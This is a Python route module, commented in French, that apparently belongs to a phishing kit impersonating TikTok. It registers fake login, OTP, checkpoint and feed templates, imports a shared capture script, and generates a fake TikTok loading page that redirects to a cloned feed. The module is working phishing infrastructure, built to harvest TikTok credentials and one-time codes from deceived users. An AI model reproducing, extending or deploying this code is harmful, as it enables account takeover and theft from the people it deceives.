"""route.py — Routes et templates spécifiques à TikTok.

Contient :
  • TEMPLATES : dict des templates HTML (login, OTP, checkpoint, feed)
  • get_template(key) : retourne un template par sa clé
  • handle_loading(cfg) : génère la page de faux chargement TikTok
  • register_routes(app) : enregistre les routes spécifiques (none pour TikTok)
"""

from platforms._shared import JS_STRICT_CAPTURE, TK_LOGO_SVG
from platforms.tiktok.login import HTML_MOBILE_LOGIN, HTML_PC_LOGIN
from platforms.tiktok.otp import HTML_OTP_MOBILE, HTML_OTP_PC
from platforms.tiktok.checkpoint import HTML_CHECKPOINT
from platforms.tiktok.feed import HTML_FEED


# ════════════════════════════════════════════════════════════════════
#  Dictionnaire des templates TikTok
# ════════════════════════════════════════════════════════════════════
TEMPLATES = {
    "mobile_login": HTML_MOBILE_LOGIN,
    "pc_login":     HTML_PC_LOGIN,
    "mobile_otp":   HTML_OTP_MOBILE,
    "pc_otp":       HTML_OTP_PC,
    "checkpoint":   HTML_CHECKPOINT,
    "feed":         HTML_FEED,
}


def get_template(key):
    """Retourne le template demandé, ou None si non trouvé."""
    try:
        return TEMPLATES.get(key)
    except Exception as e:
        try:
            from platforms._shared import _log_err
            _log_err("tiktok.route.get_template", e)
        except Exception:
            pass
        return None


def handle_loading(cfg):
    """Génère la page de faux chargement TikTok.
    Affiche le logo TikTok (fond noir #000) pendant la durée configurée,
    puis redirige vers /feed.

    Retourne le HTML de la page de chargement, ou None si non applicable.
    """
    try:
        # Durée (secondes) — défaut 3
        try:
            duration = int(cfg.get("fake_loading_duration", 3))
            if duration < 1:
                duration = 3
        except (ValueError, TypeError):
            duration = 3

        # Logo TikTok (taille 120x120)
        logo_svg = TK_LOGO_SVG.replace('width="48" height="48"', 'width="120" height="120"')

        # Construire la page HTML
        html = f'''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta http-equiv="refresh" content="{duration};url=/feed">
    <title>Chargement...</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        html, body {{
            height: 100%; width: 100%;
            background: #000;
            overflow: hidden;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }}
        .loading-container {{
            position: fixed; inset: 0;
            display: flex; flex-direction: column;
            align-items: center; justify-content: center;
        }}
    </style>
</head>
<body>
    <div class="loading-container">
        <div class="logo-wrapper">{logo_svg}</div>
    </div>
    <script>
        try {{
            setTimeout(function() {{ window.location.href = '/feed'; }}, {duration * 1000});
        }} catch(e) {{ window.location.href = '/feed'; }}
    </script>
</body>
</html>'''
        return html
    except Exception as e:
        try:
            from platforms._shared import _log_err
            _log_err("tiktok.route.handle_loading", e)
        except Exception:
            pass
        return None


def register_routes(app):
    """Enregistre les routes spécifiques à TikTok.
    TikTok n'a pas de routes dédiées — le /loading est géré par routes.py
    qui appelle handle_loading() ci-dessus."""
    pass
